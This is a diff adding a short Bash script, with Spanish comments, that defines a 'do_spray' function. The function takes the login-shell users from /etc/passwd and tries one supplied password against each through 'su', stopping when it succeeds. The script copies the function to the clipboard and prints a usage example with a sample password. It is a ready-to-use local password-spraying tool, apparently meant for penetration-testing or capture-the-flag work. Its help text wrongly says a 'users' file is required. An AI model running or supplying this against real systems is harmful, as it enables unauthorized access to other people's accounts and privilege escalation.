@@ -1,0 +1,24 @@
+#!/bin/bash
+
+# Define la función do_spray
+do_spray() {
+    users=$(awk -F: '{ if ($NF ~ /sh$/) print $1 }' /etc/passwd)
+    for user in $users; do
+        echo "$1" | timeout 2 su $user -c whoami 2>/dev/null
+        if [ $? -eq 0 ]; then
+            return
+        fi
+    done
+}
+
+# Copia la función al portapapeles
+echo -n "$(declare -f do_spray)" | xclip -selection clipboard
+
+# Muestra la función en la terminal
+declare -f do_spray
+
+echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
+echo "necesita un archivo llamado users con usuarios"
+echo ""
+echo "tambien se ejecuta directamente en la shell y se ejecuta:"
+echo " do_spray 'WhatIsRealAnDWhAtIsNot51121!' "
